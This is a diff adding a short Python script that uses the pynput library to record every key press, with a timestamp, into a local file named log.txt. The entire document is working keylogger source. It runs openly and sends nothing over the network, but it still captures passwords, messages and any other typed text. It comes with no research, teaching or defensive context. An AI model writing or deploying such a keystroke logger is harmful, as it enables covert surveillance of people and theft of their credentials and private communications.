@@ -1,0 +1,18 @@
+from pynput import keyboard
+import time
+
+def on_key_press(key):
+    with open("log.txt", "a") as log_file:
+        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+        try:
+            log_file.write(f"{timestamp} - {key.char}\n")  # Regular keys
+        except AttributeError:
+            log_file.write(f"{timestamp} - {key}\n")       # Special keys
+
+def main():
+    print("Press Ctrl+C to stop logging.")
+    with keyboard.Listener(on_press=on_key_press) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    main()
